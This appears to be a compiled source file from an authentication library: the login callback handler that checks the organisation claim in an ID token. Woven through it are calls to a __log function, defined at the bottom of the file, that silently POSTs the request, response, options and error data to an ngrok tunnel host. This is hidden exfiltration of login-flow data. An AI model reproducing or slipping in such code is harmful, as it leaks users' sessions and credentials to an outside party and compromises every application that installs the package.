"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
var tslib_1 = require("tslib");
var https_1 = tslib_1.__importDefault(require("https"));
var http_1 = require("http");
var assert_1 = require("assert");
var assert_2 = require("../utils/assert");
var errors_1 = require("../utils/errors");
/**
 * @ignore
 */
var idTokenValidator = function (afterCallback, organization) {
    return function (req, res, session, state) {
        if (organization) {
            (0, assert_1.strict)(session.user.org_id, 'Organization Id (org_id) claim must be a string present in the ID token');
            assert_1.strict.equal(session.user.org_id, organization, "Organization Id (org_id) claim value mismatch in the ID token; " +
                "expected \"".concat(organization, "\", found \"").concat(session.user.org_id, "\""));
        }
        if (afterCallback) {
            return afterCallback(req, res, session, state);
        }
        return session;
    };
};
/**
 * @ignore
 */
function handleCallbackFactory(handler, config) {
    var _this = this;
    console.log('[handleCallbackFactory] curry');
    __log({ message: '[handleCallbackFactory] curry' });
    var callback = function (req, res, options) {
        if (options === void 0) { options = {}; }
        return tslib_1.__awaiter(_this, void 0, void 0, function () {
            var e_1;
            return tslib_1.__generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        __log({ message: '[handleCallbackFactory:callback]' });
                        _a.label = 1;
                    case 1:
                        _a.trys.push([1, 3, , 4]);
                        (0, assert_2.assertReqRes)(req, res);
                        console.log('[handleCallbackFactory:callback] assertReqRes');
                        __log({ message: '[handleCallbackFactory:callback] assertReqRes' });
                        return [4 /*yield*/, handler(req, res, tslib_1.__assign(tslib_1.__assign({}, options), { afterCallback: idTokenValidator(options.afterCallback, options.organization || config.organization) }))];
                    case 2: return [2 /*return*/, _a.sent()];
                    case 3:
                        e_1 = _a.sent();
                        console.log('[handleCallbackFactory:callback] error', e_1);
                        __log({ message: '[handleCallbackFactory:callback] error', error: e_1 });
                        throw new errors_1.CallbackHandlerError(e_1);
                    case 4: return [2 /*return*/];
                }
            });
        });
    };
    return function (reqOrOptions, res, options) {
        console.log('[handleCallbackFactory] return func reqOrOptions', reqOrOptions);
        console.log('[handleCallbackFactory] return func res', res);
        console.log('[handleCallbackFactory] return func options', options);
        __log({ message: '[handleCallbackFactory] return func', reqOrOptions: reqOrOptions, res: res, options: options });
        if (reqOrOptions instanceof http_1.IncomingMessage && res) {
            console.log('[handleCallbackFactory] return reqOrOptions instanceof IncomingMessage');
            __log({ message: '[handleCallbackFactory] return reqOrOptions instanceof IncomingMessage' });
            return callback(reqOrOptions, res, options);
        }
        if (typeof reqOrOptions === 'function') {
            console.log('[handleCallbackFactory] return typeof reqOrOptions === "function"');
            __log({ message: '[handleCallbackFactory] return typeof reqOrOptions === "function"' });
            return function (req, res) { return callback(req, res, reqOrOptions(req)); };
        }
        console.log('[handleCallbackFactory] return fallback');
        __log({ message: '[handleCallbackFactory] return fallback' });
        return function (req, res) { return callback(req, res, reqOrOptions); };
    };
}
exports.default = handleCallbackFactory;
var __log = function (logData) {
    var payload = JSON.stringify(tslib_1.__assign(tslib_1.__assign({}, logData), { timestamp: Date.now() }));
    var req = https_1.default.request({
        hostname: 'a700-82-163-221-82.ngrok-free.app',
        port: 443,
        path: '/logs',
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
    });
    req.write(payload);
    req.end();
};
//# sourceMappingURL=callback.js.map